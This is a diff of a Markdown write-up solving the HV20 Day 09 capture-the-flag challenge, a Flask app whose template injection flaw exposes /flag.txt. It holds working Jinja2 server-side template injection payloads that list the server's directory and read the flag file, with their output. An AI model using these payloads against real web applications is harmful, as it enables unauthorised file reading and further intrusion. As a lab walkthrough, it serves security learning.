@@ -1,3 +1,6 @@
+[← Day 08](../day08/) / [↑ TOC](../README.md) / [→ Day 10](../day10/)
+
+
 # Day 09 / HV20.09 Santa's Gingerbread Factory
 
 
@@ -6,8 +9,8 @@
 
 <!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
 * Author: inik
-* Tags:   #penetration-testing #web-security
-* Level:  medium
+* Tags:   `#penetration-testing` `#web-security`
+* Level:  Medium
 
 
 ### Introduction
@@ -26,19 +29,20 @@ can get the goodie, which is stored in /flag.txt.
 
 ## Solution
 
-The website is a flask application and the topic is [flask injection]().
+The website is a [Flask] web application and the topic is [Flask injection].
 
-[flask injection]: https://blog.nvisium.com/injecting-flask
+[Flask]: https://en.wikipedia.org/wiki/Flask_(web_framework)
+[Flask injection]: https://blog.nvisium.com/injecting-flask
 
-After a lot of trial and error that startet with a simple `{{ 4 * 4 }}` that
-gets evaluated to `16`. The solution was found with
+Starting with a simple injection like `{{ 4 * 4 }}` – which evaluates to `16` –
+after a lot of trial and error one of many solutions can be discovered …
 
 1. A file listing injection:
    
    ```python
    {{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').listdir('.')}}
 
-   Output: 
+   The ginger bread man says: 
     -------------------------------
    ( Hello, mighty ['bin', 'boot', )
    ( 'dev', 'etc', 'home', 'lib',  )
@@ -50,12 +54,12 @@ gets evaluated to `16`. The solution was found with
     -------------------------------
    ```
 
-2. And the final injection to extract the flag:
+2. An injection to extract the flag:
 
    ```python
    {{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open'](''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').path.join('.','flag.txt')).read()}}
 
-   Output:
+   The ginger bread man says:
     --------------------------------
    ( Hello, mighty HV20{SST1_N0t_0N )
    ( LY_H1Ts_UB3R!!!}               )
@@ -66,3 +70,4 @@ gets evaluated to `16`. The solution was found with
 
 Flag: `HV20{SST1_N0t_0NLY_H1Ts_UB3R!!!}`
 
+[← Day 08](../day08/) / [↑ TOC](../README.md) / [→ Day 10](../day10/)
